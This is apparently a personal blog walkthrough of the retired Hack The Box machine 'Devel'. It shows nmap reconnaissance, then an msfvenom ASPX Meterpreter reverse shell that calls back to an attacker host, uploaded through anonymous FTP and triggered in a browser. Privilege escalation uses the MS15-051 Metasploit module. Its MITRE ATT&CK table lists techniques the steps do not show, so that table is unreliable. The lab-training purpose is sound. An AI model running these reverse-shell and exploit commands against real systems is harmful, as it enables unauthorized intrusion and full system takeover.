
---
title: "Devel Rooted: A Hack The Box Walkthrough"
canonical_url: https://notesbynisha.com/blog/hackthebox/devel-rooted/
date: 2025-04-22
layout: single
classes: wide
author_profile: true
toc: true
toc_label: "Table of Contents"
toc_sticky: true
categories:
  - Blog
  - HackTheBox
tags:
  - hackthebox
  - windows
  - initial-access
  - ftp
  - webdav
  - metasploit
  - privilege-escalation
excerpt: "This post is a walkthrough of the 'Devel' retired machine from Hack The Box. I gain initial access through an exposed FTP and WebDAV setup, then escalate privileges using MS15-051."
header:
  image: /assets/images/htb/devel/devel-00.png
  teaser: /assets/images/htb/devel/devel-00.png
  overlay_filter: "rgba(0, 0, 0, 0.3)"
  caption: "Hack The Box - Devel Machine"
---

## 🧠 Summary

- **Target OS**: Windows Server 2008 R2
- **Difficulty**: Easy
- **IP Address**: 10.129.249.251
- **Initial Access Vector**: FTP upload to WebDAV
- **Privilege Escalation Vector**: Kernel exploit (MS15-051)
- **Tools Used**: Nmap, Metasploit, msfvenom

---

## 🛰️ Reconnaissance

I began with a full port scan using Nmap:

```bash
nmap -p- -A -T4 10.129.249.251
```

![Nmap Scan Screenshot](/assets/images/htb/devel/devel-02.png)

### 🔍 Results:

- **Port 21 (FTP)**:
  - `Microsoft ftpd`
  - **Anonymous login** allowed
  - Files: `aspnet_client/`, `iisstart.htm`, `welcome.png`

- **Port 80 (HTTP)**:
  - `Microsoft IIS httpd 7.5`
  - TRACE method enabled
  - OS Guess: Windows Server 2008 R2 / Windows 7 SP1

---

## 🌐 Web Server Enumeration

I browsed the site directly via:

```text
http://10.129.249.251
```

![IIS7 Default Page](/assets/images/htb/devel/devel-03.png)

The page showed the default **IIS7 welcome page**, confirming a likely upload path vulnerability via FTP to the webroot.

---

## 🎯 Initial Foothold

I generated a reverse shell in ASPX format:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.XX LPORT=4444 -f aspx > shell.aspx
```

Uploaded it via FTP (anonymous login):

```bash
ftp 10.129.249.251
put shell.aspx
```

Then triggered it in the browser:

```
http://10.129.249.251/shell.aspx
```

Metasploit caught the reverse shell with a listener:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.XX
set LPORT 4444
run
```

---

## 📈 Privilege Escalation

### Step 1: Checked for Kernel Exploits

```bash
systeminfo
```

Identified Windows Server 2008 R2 SP1 — vulnerable to **MS10-015** and **MS15-051**.

### Step 2: Attempted MS10-015

```bash
use exploit/windows/local/ms10_015_kitrap0d
set SESSION <meterpreter session>
run
```

But the exploit failed — I forgot to set the correct `LHOST` and Metasploit defaulted to `eth0` instead of my `tun0`. After troubleshooting, I pivoted.

### Step 3: Successful Exploit with MS15-051

```bash
use exploit/windows/local/ms15_051_client_copy_image
set SESSION <meterpreter session>
set LHOST 10.10.14.XX
run
```

This successfully gave me **SYSTEM** shell.

---

## 🏁 Capture the Flags

```bash
type C:\Users\<user>\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🧩 MITRE ATT&CK Mapping

| Tactic         | Technique                              |
|----------------|----------------------------------------|
| Initial Access | [T1078.001 - Valid Accounts: Local Accounts](https://attack.mitre.org/techniques/T1078/001/) |
| Execution      | [T1059.005 - Command and Scripting Interpreter: Visual Basic](https://attack.mitre.org/techniques/T1059/005/) |
| Priv. Esc.     | [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) |
| Discovery      | [T1082 - System Information Discovery](https://attack.mitre.org/techniques/T1082/) |
| Persistence    | [T1053.005 - Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) |

---

![Proof of Root - Devel](/assets/images/htb/devel/devel-rooted.png)
